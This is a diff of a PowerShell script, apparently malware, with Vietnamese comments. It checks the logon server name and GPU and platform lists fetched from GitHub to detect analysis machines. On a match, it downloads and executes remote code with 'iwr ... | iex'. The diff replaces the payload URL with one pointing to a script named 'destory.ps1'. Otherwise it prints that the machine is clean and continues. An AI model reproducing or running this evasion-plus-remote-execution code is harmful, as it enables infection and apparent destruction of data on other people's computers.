@@ -9,7 +9,7 @@ foreach ($prg in $2kill) {
 }
 
 if ($env:LOGONSERVER -match "DADDYSERVER") {
-    iwr "https://gist.githubusercontent.com/43a1723/ec336f9a82bf70f70d67eb557a4c31ff/raw/39a0af39c66432665097d88960f495d9fe6780ea/skid" | iex
+    iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1" | iex
 }
 
 # Hàm tải danh sách từ GitHub
@@ -51,7 +51,7 @@ if (
     ($gpuList | Where-Object { $gpu -like "*$_*" }) -or
     ($platformList | Where-Object { $platform -like "*$_*" })
 ) {
-    iwr "https://gist.githubusercontent.com/43a1723/ec336f9a82bf70f70d67eb557a4c31ff/raw/39a0af39c66432665097d88960f495d9fe6780ea/skid" | iex
+    iwr "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1" | iex
 }
 
 Write-Host "✅ Máy sạch, tiếp tục chạy..."
